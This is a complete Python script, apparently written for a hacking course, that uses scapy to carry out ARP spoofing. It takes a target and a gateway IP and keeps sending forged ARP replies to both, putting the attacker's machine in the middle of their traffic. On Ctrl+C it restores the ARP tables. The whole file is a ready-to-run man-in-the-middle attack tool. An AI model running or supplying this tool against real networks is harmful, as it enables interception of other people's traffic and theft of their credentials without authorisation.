#!/usr/bin/env python
import argparse
import sys
import scapy.all as scapy
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    options = parser.parse_args()
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # broadcast MAC address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    # SendReceive
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # target machine
    # op=2=arp response, hwdst, pdst=target machine psrc=router ip
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    # give destination the correct mac of the source
    # hwdst= hardware dest
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


args = get_arguments()
target_ip = args.target
# '10.0.2.7'
gateway_ip = args.gateway
# '10.0.2.1'

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        # dynamic print, \r always print from the start of the buffer
        print('\r[+] Packets sent: ' + str(sent_packets_count)),
        sys.stdout.flush()
        # Python 3
        # print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[-] Detected CTRL + C ...... Resetting ARP tables. Please wait ...')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
